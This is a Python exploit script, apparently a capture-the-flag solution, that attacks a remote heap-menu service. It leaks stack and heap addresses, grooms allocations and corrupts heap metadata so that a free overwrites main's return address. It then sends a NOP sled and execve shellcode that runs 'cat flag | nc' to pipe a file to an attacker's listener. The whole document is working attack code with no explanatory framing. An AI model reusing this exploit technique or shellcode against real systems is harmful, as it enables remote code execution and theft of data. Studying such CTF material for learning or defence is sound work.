import socket
import sys
import struct
from cStringIO import StringIO

def execve_shellcode(cmd):

  shellcode = bytearray(
    '\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\xeb'
    '\x2b\x5a\x50\x52\xeb\x11\x5a\x52\xeb\x15\x5a\x52\x5f\x52\x54\x5e'
    '\x50\x5a\x6a\x3b\x58\x0f\x05\xe8\xea\xff\xff\xff\x2d\x63\x00\xe8'
    '\xe6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\xe8\xd0\xff\xff'
    '\xff'
    +  cmd + '\x00')

  return shellcode

def read_to_prompt(s, prompt='| '):
  data = s.recv(1024)
  sys.stderr.write('%s\n' % (data))
  while data[len(data) -2:] != prompt:
    tmp = s.recv(1024)
    sys.stderr.write('%s\n' % (tmp))
    data += tmp
    if tmp == '':
      break
  return data

def main():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  s.connect((sys.argv[1], int(sys.argv[2])))

  shellcode = execve_shellcode('cat flag | nc %s %s' % (sys.argv[3], sys.argv[4]))

  sys.stderr.write('\nEnsure a listener is running: nc -l %s %s\n\n' % (sys.argv[3], sys.argv[4]))

  raw_input('Press enter for pwnage...')

  read_to_prompt(s)

  #Get stack address
  sys.stderr.write('Asking for memory leak\n')
  s.send('N\n')
  data = read_to_prompt(s)
  needle = 'Here you go: '
  offset = data.find(needle) + len(needle)
  stack_addr = int(data[offset:data.find('\n', offset)], base=0x10)

  main_ret_rsp = stack_addr + 0x13c

  #First alloc
  sys.stderr.write('Sending Alloc cmd\n')
  s.send('A\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending Size 0x1000\n')
  s.send('%s\n' % (0x1000))
  data = read_to_prompt(s)

  #Free first alloc
  sys.stderr.write('Sending F cmd\n')
  s.send('F\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending index\n')
  s.send('1\n')
  data = read_to_prompt(s)

  #Second alloc
  sys.stderr.write('Sending Alloc cmd\n')
  s.send('A\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending Size 0x200\n')
  s.send('%s\n' % (0x200))
  data = read_to_prompt(s)

  #Third alloc
  sys.stderr.write('Sending Alloc cmd\n')
  s.send('A\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending Size 0x200\n')
  s.send('%s\n' % (0x200))
  data = read_to_prompt(s)

  #Fourth alloc
  sys.stderr.write('Sending Alloc cmd\n')
  s.send('A\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending Size 0x200\n')
  s.send('%s\n' % (0x200))
  data = read_to_prompt(s)

  #Fifth alloc
  sys.stderr.write('Sending Alloc cmd\n')
  s.send('A\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending Size 0x200\n')
  s.send('%s\n' % (0x200))
  data = read_to_prompt(s)

  #Free second alloc
  sys.stderr.write('Sending F cmd\n')
  s.send('F\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending index\n')
  s.send('2\n')
  data = read_to_prompt(s)

  #Free third alloc
  sys.stderr.write('Sending F cmd\n')
  s.send('F\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending index\n')
  s.send('3\n')
  data = read_to_prompt(s)

  #Free fourth alloc
  sys.stderr.write('Sending F cmd\n')
  s.send('F\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending index\n')
  s.send('4\n')
  data = read_to_prompt(s)

  #Free fifth alloc
  sys.stderr.write('Sending F cmd\n')
  s.send('F\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending index\n')
  s.send('5\n')
  data = read_to_prompt(s)

  #Send dummy write
  sys.stderr.write('Sending Write cmd\n')
  s.send('W\n')
  data = read_to_prompt(s, ': ')

  #Get heap address 
  needle = '3) '
  offset = data.find(needle) + len(needle)
  heap_addr = int(data[offset:data.find(' ', offset)], base=0x10)

  sys.stderr.write('Sending index\n')
  s.send('1\n')
  data = read_to_prompt(s, ': ')
  s.send('1\n')
  data = read_to_prompt(s)

  exploit_bytes = StringIO()
  exploit_bytes.write('\x00' * (0x200)) #padding
  # The important part, this offset will be added to the heap address
  # and needs to point at the return address for main on the stack
  # the low bit also needs to be set to take the correct path in the free routine
  exploit_bytes.write(struct.pack('<q', (main_ret_rsp - heap_addr) + 0x10 | 0x1))
  exploit_bytes.write('\x88' * 0x8) #more padding
  exploit_bytes.write(struct.pack('<Q', heap_addr)) #Where main's ret address is on the stack

  #Corrupt the heap
  sys.stderr.write('Sending Write cmd\n')
  s.send('W\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending index\n')
  s.send('1\n')
  data = read_to_prompt(s, ': ')
  s.send(exploit_bytes.getvalue())
  data = read_to_prompt(s)

  #Send free command, will a corrupt heap this overwrite's main's return address where
  #we are going to put our shellcode
  sys.stderr.write('Sending F cmd\n')
  s.send('F\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending index\n')
  s.send('3\n')
  data = read_to_prompt(s)

  #Write shellcode
  sys.stderr.write('Sending Write cmd\n')
  s.send('W\n')
  data = read_to_prompt(s, ': ')
  sys.stderr.write('Sending index\n')
  s.send('1\n')
  data = read_to_prompt(s, ': ')
  # Write a nop sled then our shellcode, just in case
  s.send(('\x90' * 0x408) + shellcode)
  data = read_to_prompt(s)

  # Exit to trigger our shellcode
  sys.stderr.write('Sending Exit cmd\n')
  s.send('E\n')

  sys.stderr.write('\nCheck yo\' listener\n')

if __name__ == '__main__':
  main()
